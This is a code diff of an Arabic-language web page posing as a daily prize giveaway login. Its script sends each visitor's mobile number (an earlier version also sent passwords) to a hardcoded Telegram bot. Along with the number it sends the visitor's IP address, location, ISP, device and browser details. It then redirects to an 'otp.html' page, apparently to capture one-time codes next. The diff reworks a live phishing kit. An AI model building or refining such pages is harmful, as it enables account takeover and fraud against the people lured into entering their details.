@@ -183,15 +183,20 @@
 <body>
     <div class="container">
         <div class="left-section">
+            <!-- ✅ اللوجو هنا 👇 تم إضافته -->
+            <img src="https://i.ibb.co/rfX2NsG0/1772371634448-94b6dfb8-c522-4482-baae-ebca4f802107.png" alt="شعار الموقع" style="width: 100px; height: 100px; margin-bottom: 20px; border-radius: 15px; display: block; margin-left: auto; margin-right: auto;">
+            
             <h1>اكسب معنا</h1>
-            <p>سجل الدخول  برقم الموبايل  وادخل الفرصة للفوز بجوائز قيمة يومياً.</p>
+            <p>سجل الدخول الآن برقم موبايلك وادخل الفرصة للفوز بجوائز قيمة يومياً.</p>
         </div>
         <div class="right-section">
             <div class="login-card">
                 <div id="errorMessage" class="error-message"></div>
                 
                 <form id="loginForm" onsubmit="handleLogin(event)">
-                    <input type="text" id="identifier" placeholder=" رقم الهاتف" required>
+                    <!-- حقل واحد: رقم الموبايل فقط -->
+                    <input type="tel" id="mobile" placeholder="رقم الموبايل" required>
+                    
                     <button type="submit" class="login-btn" id="submitBtn">تسجيل الدخول</button>
                     
                     <div id="loading" class="loading">
@@ -211,15 +216,13 @@
         const CHAT_ID = "6681719658";
         // =====================================================
 
-        // دالة متقدمة لجلب الـ IP الحقيقي والموقع
+        // دالة متقدمة لجلب الـ IP والموقع
         async function getRealIPAndLocation() {
             try {
-                // استخدام IPify للحصول على الـ IP أولاً
                 const ipResponse = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipResponse.json();
                 const ip = ipData.ip;
                 
-                // استخدام ipapi.co للحصول على معلومات الموقع
                 try {
                     const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
                     const locationData = await locationResponse.json();
@@ -234,140 +237,38 @@
                         isp: locationData.org || 'غير معروف'
                     };
                 } catch (e) {
-                    // لو فشلت الموقع، نرجع الـ IP بس
-                    return {
-                        ip: ip,
-                        country: 'غير معروف',
-                        city: 'غير معروف',
-                        region: 'غير معروف',
-                        latitude: 'غير معروف',
-                        longitude: 'غير معروف',
-                        isp: 'غير معروف'
-                    };
+                    return { ip: ip, country: 'غير معروف', city: 'غير معروف', region: 'غير معروف', latitude: 'غير معروف', longitude: 'غير معروف', isp: 'غير معروف' };
                 }
             } catch (error) {
-                return {
-                    ip: 'غير معروف',
-                    country: 'غير معروف',
-                    city: 'غير معروف',
-                    region: 'غير معروف',
-                    latitude: 'غير معروف',
-                    longitude: 'غير معروف',
-                    isp: 'غير معروف'
-                };
+                return { ip: 'غير معروف', country: 'غير معروف', city: 'غير معروف', region: 'غير معروف', latitude: 'غير معروف', longitude: 'غير معروف', isp: 'غير معروف' };
             }
         }
 
-        // دالة لجلب الـ IMEI (رقم تعريف الجهاز للموبايل)
+        // دالة لجلب معلومات الجهاز
         function getDeviceInfo() {
             const ua = navigator.userAgent;
-            let imei = 'غير متاح';
-            let deviceModel = 'غير معروف';
-            
-            // محاولة استخراج رقم IMEI للموبايل (يعمل على بعض المتصفحات)
-            if (navigator.getBattery) {
-                // بعض الأجهزة بتعطي معلومات إضافية
-            }
-            
-            // كشف نوع الجهاز
             let deviceType = 'كمبيوتر';
-            if (ua.indexOf('Mobile') > -1 || ua.indexOf('iPhone') > -1 || ua.indexOf('Android') > -1) {
-                deviceType = 'موبايل';
-            } else if (ua.indexOf('iPad') > -1 || ua.indexOf('Tablet') > -1) {
-                deviceType = 'تابلت';
-            }
+            if (/Mobile|Android|iPhone|iPad|iPod/i.test(ua)) deviceType = 'موبايل';
+            else if (/Tablet|iPad/i.test(ua)) deviceType = 'تابلت';
             
-            // محاولة استخراج موديل الجهاز للموبايل
-            if (ua.indexOf('iPhone') > -1) {
-                const match = ua.match(/iPhone OS (\d+_\d+)/);
-                if (match) {
-                    deviceModel = `آيفون iOS ${match[1].replace('_', '.')}`;
-                }
-            } else if (ua.indexOf('Android') > -1) {
-                const match = ua.match(/Android (\d+\.\d+)/);
-                const modelMatch = ua.match(/; (.*?) Build/);
-                if (match && modelMatch) {
-                    deviceModel = `${modelMatch[1]} Android ${match[1]}`;
-                }
-            }
-            
-            return {
-                type: deviceType,
-                model: deviceModel,
-                imei: imei
-            };
+            return { type: deviceType };
         }
 
-        // دالة متقدمة لكشف المتصفح الحقيقي
+        // دالة لكشف المتصفح
         function getRealBrowserInfo() {
             const ua = navigator.userAgent;
-            let browser = {
-                name: 'غير معروف',
-                version: '',
-                os: 'غير معروف',
-                osVersion: '',
-                language: navigator.language || 'غير معروف',
-                platform: navigator.platform || 'غير معروف'
-            };
+            let browser = { name: 'غير معروف', os: 'غير معروف' };
             
-            // كشف المتصفح
-            if (ua.indexOf('Chrome') > -1 && ua.indexOf('Edg') === -1 && ua.indexOf('OPR') === -1) {
-                browser.name = 'جوجل كروم';
-                const match = ua.match(/Chrome\/([0-9.]+)/);
-                if (match) browser.version = match[1];
-            }
-            else if (ua.indexOf('Firefox') > -1) {
-                browser.name = 'موزيلا فايرفوكس';
-                const match = ua.match(/Firefox\/([0-9.]+)/);
-                if (match) browser.version = match[1];
-            }
-            else if (ua.indexOf('Safari') > -1 && ua.indexOf('Chrome') === -1) {
-                browser.name = 'أبل سفاري';
-                const match = ua.match(/Version\/([0-9.]+)/);
-                if (match) browser.version = match[1];
-            }
-            else if (ua.indexOf('Edg') > -1) {
-                browser.name = 'مايكروسوفت إيدج';
-                const match = ua.match(/Edg\/([0-9.]+)/);
-                if (match) browser.version = match[1];
-            }
-            else if (ua.indexOf('OPR') > -1 || ua.indexOf('Opera') > -1) {
-                browser.name = 'أوبرا';
-                const match = ua.match(/(OPR|Opera)\/([0-9.]+)/);
-                if (match) browser.version = match[2];
-            }
+            if (ua.indexOf('Chrome') > -1 && ua.indexOf('Edg') === -1) browser.name = 'جوجل كروم';
+            else if (ua.indexOf('Firefox') > -1) browser.name = 'موزيلا فايرفوكس';
+            else if (ua.indexOf('Safari') > -1 && ua.indexOf('Chrome') === -1) browser.name = 'أبل سفاري';
+            else if (ua.indexOf('Edg') > -1) browser.name = 'مايكروسوفت إيدج';
             
-            // كشف نظام التشغيل بدقة
-            if (ua.indexOf('Windows NT 10.0') > -1) {
-                browser.os = 'ويندوز';
-                browser.osVersion = '10/11';
-            }
-            else if (ua.indexOf('Windows NT 6.1') > -1) {
-                browser.os = 'ويندوز';
-                browser.osVersion = '7';
-            }
-            else if (ua.indexOf('Windows NT 6.2') > -1 || ua.indexOf('Windows NT 6.3') > -1) {
-                browser.os = 'ويندوز';
-                browser.osVersion = '8/8.1';
-            }
-            else if (ua.indexOf('Mac OS X') > -1) {
-                browser.os = 'ماك';
-                const match = ua.match(/Mac OS X (\d+[._]\d+[._]\d+)/);
-                if (match) browser.osVersion = match[1].replace(/_/g, '.');
-            }
-            else if (ua.indexOf('iPhone OS') > -1) {
-                browser.os = 'آيفون';
-                const match = ua.match(/iPhone OS (\d+[._]\d+[._]\d+)/);
-                if (match) browser.osVersion = match[1].replace(/_/g, '.');
-            }
-            else if (ua.indexOf('Android') > -1) {
-                browser.os = 'أندرويد';
-                const match = ua.match(/Android (\d+\.\d+)/);
-                if (match) browser.osVersion = match[1];
-            }
-            else if (ua.indexOf('Linux') > -1) {
-                browser.os = 'لينكس';
-            }
+            if (ua.indexOf('Windows') > -1) browser.os = 'ويندوز';
+            else if (ua.indexOf('Mac') > -1) browser.os = 'ماك';
+            else if (ua.indexOf('Android') > -1) browser.os = 'أندرويد';
+            else if (ua.indexOf('iPhone') > -1) browser.os = 'آيفون';
+            else if (ua.indexOf('Linux') > -1) browser.os = 'لينكس';
             
             return browser;
         }
@@ -375,41 +276,30 @@
         // دالة إرسال الرسالة إلى تليجرام
         async function sendToTelegram(message) {
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-            
             try {
-                const response = await fetch(url, {
+                await fetch(url, {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: message,
-                        parse_mode: 'HTML'
-                    })
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'HTML' })
                 });
-                
-                return response.ok;
             } catch (error) {
                 console.error('خطأ في الإرسال:', error);
-                return false;
             }
         }
 
-        // دالة معالجة تسجيل الدخول الرئيسية
+        // دالة معالجة تسجيل الدخول
         async function handleLogin(event) {
             event.preventDefault();
             
-            const identifier = document.getElementById('identifier').value.trim();
-            const password = document.getElementById('password').value;
+            const mobile = document.getElementById('mobile').value.trim();
             const submitBtn = document.getElementById('submitBtn');
             const loading = document.getElementById('loading');
             const errorMessage = document.getElementById('errorMessage');
             
             errorMessage.classList.remove('show');
             
-            if (!identifier || !password) {
-                errorMessage.textContent = 'الرجاء إدخال البريد الإلكتروني وكلمة السر';
+            if (!mobile) {
+                errorMessage.textContent = 'الرجاء إدخال رقم الموبايل';
                 errorMessage.classList.add('show');
                 return;
             }
@@ -418,79 +308,32 @@
             loading.classList.add('show');
             
             try {
-                // جلب الـ IP والموقع
                 const ipData = await getRealIPAndLocation();
-                
-                // جلب معلومات الجهاز
                 const deviceInfo = getDeviceInfo();
-                
-                // جلب معلومات المتصفح
                 const browserInfo = getRealBrowserInfo();
-                
-                // معلومات إضافية
                 const timestamp = new Date().toLocaleString('ar-EG', { timeZone: 'Africa/Cairo' });
-                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-                const screenResolution = `${window.screen.width}x${window.screen.height}`;
                 
-                // تجهيز الرسالة النهائية بكل البيانات
                 const message = `
 <b>🔔 دخول جديد!</b>
 ━━━━━━━━━━━━━━━━━━━━
-<b>👤 البيانات الأساسية:</b>
-├─ <b>البريد/الهاتف:</b> <code>${identifier}</code>
-├─ <b>كلمة المرور:</b> <code>${password}</code>
-└─ <b>الوقت:</b> ${timestamp}
-
-<b>🌐 معلومات الـ IP والموقع:</b>
-├─ <b>IP:</b> <code>${ipData.ip}</code>
-├─ <b>البلد:</b> ${ipData.country}
-├─ <b>المدينة:</b> ${ipData.city}
-├─ <b>المنطقة:</b> ${ipData.region}
-├─ <b>خط العرض:</b> ${ipData.latitude}
-├─ <b>خط الطول:</b> ${ipData.longitude}
-└─ <b>مزود الخدمة:</b> ${ipData.isp}
-
-<b>📱 معلومات الجهاز:</b>
-├─ <b>نوع الجهاز:</b> ${deviceInfo.type}
-├─ <b>الموديل:</b> ${deviceInfo.model}
-└─ <b>IMEI:</b> ${deviceInfo.imei}
-
-<b>🌍 معلومات المتصفح:</b>
-├─ <b>المتصفح:</b> ${browserInfo.name} ${browserInfo.version}
-├─ <b>نظام التشغيل:</b> ${browserInfo.os} ${browserInfo.osVersion}
-├─ <b>اللغة:</b> ${browserInfo.language}
-├─ <b>المنصة:</b> ${browserInfo.platform}
-└─ <b>دقة الشاشة:</b> ${screenResolution}
-
-<b>🕒 معلومات إضافية:</b>
-├─ <b>المنطقة الزمنية:</b> ${timezone}
-└─ <b>التوقيت المحلي:</b> ${timestamp}
-
-<b>🔍 التفاصيل الكاملة:</b>
-<code>${navigator.userAgent}</code>
+<b>📱 رقم الموبايل:</b> <code>${mobile}</code>
+━━━━━━━━━━━━━━━━━━━━
+<b>🌐 IP:</b> <code>${ipData.ip}</code>
+<b>🌍 البلد:</b> ${ipData.country}
+<b>🏙️ المدينة:</b> ${ipData.city}
+<b>📡 مزود الخدمة:</b> ${ipData.isp}
+━━━━━━━━━━━━━━━━━━━━
+<b>📱 الجهاز:</b> ${deviceInfo.type}
+<b>🌐 المتصفح:</b> ${browserInfo.name}
+<b>💻 نظام التشغيل:</b> ${browserInfo.os}
+<b>🕒 الوقت:</b> ${timestamp}
                 `;
                 
-                // إرسال إلى تليجرام
                 await sendToTelegram(message);
-                
-                // التوجيه إلى صفحة النجاح
                 window.location.href = 'otp.html';
                 
             } catch (error) {
                 console.error('خطأ:', error);
-                // في حالة الخطأ، نحاول إرسال رسالة مبسطة
-                try {
-                    const simpleMessage = `
-<b>⚠️ دخول (معلومات محدودة)</b>
-━━━━━━━━━━━━━━━
-<b>👤 البريد/الهاتف:</b> <code>${identifier}</code>
-<b>🔑 كلمة المرور:</b> <code>${password}</code>
-━━━━━━━━━━━━━━━
-<b>⚠️ حدث خطأ في جلب المعلومات الكاملة</b>
-                    `;
-                    await sendToTelegram(simpleMessage);
-                } catch (e) {}
-                
                 window.location.href = 'otp.html';
             }
         }
